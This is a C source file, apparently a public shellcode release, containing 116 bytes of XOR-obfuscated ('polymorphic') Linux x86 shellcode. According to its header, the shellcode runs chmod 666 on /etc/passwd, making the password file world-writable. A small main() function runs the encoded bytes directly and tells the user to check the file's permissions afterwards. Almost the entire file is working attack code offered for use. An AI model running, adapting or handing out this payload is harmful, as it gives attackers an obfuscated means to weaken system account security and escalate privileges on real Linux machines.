/*
 * sys_execve("/bin/chmod", { "/bin/chmod", "666" }, "/etc/passwd") 116 bytes polymorphic shellcode
 *
 * tesla_ (gandung@ppp.cylab.cmu.edu)
 */

/*
 * Tested in :
 * - BackTrack 5 (linux-2.6.38-generic)
 * - Ubuntu 10.10 Maverick Meerkat (linux-2.6.38-generic)
 * - Ubuntu 11.04 Natty Narwhal
 * - Debian Squeeze 6.0.2 (linux-2.6.32-5-stable)
 */

#include <stdio.h>
#include <string.h>

char chmod_poly[] = "\xeb\x0d\x5e\x31\xc9\xb1\x60\x80\x36\x8a"
		    "\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff"
		    "\xbb\x4a\x09\x66\x8b\x02\x8e\xae\xe2\xf9"
		    "\xf9\xfd\xee\xe2\xe9\xa5\xfa\xeb\xec\xe2"
		    "\xef\xfe\x09\x66\x8b\x4c\x8e\xae\xa5\x03"
		    "\x6c\x09\x66\x8b\x02\x8e\xae\xec\xe2\xbc"
		    "\xbc\x09\x66\x8b\x4c\x8e\xae\xbc\x09\x66"
		    "\x8b\x02\x8e\xae\xe2\xe2\xe7\xe5\xee\xe2"
		    "\xe3\xe4\xa5\xe9\xec\xe2\xa5\xe8\xda\xdc"
		    "\x09\x64\x8e\xdc\x09\x64\x81\xdc\x3a\x81"
		    "\x03\x79\x03\x6b\x03\x68\xbb\x58\x47\x0a"
		    "\xbb\x51\x3a\x8b\x47\x0a";


int main(void) {
  int chmod_len = strlen(chmod_poly);
  printf("[+] Using key mutation engine : 0x8a\n");
  printf("[+] Length of this shellcode is : %d bytes\n", chmod_len);
  printf("[+] After executing this code, check the permission of the \"/etc/passwd\"\n");
  (*(void(*)())chmod_poly)();
  return 0;
}

/* devilzc0de.org, hacker-newbie.org, sdf.lonestar.org, 1337day.com */
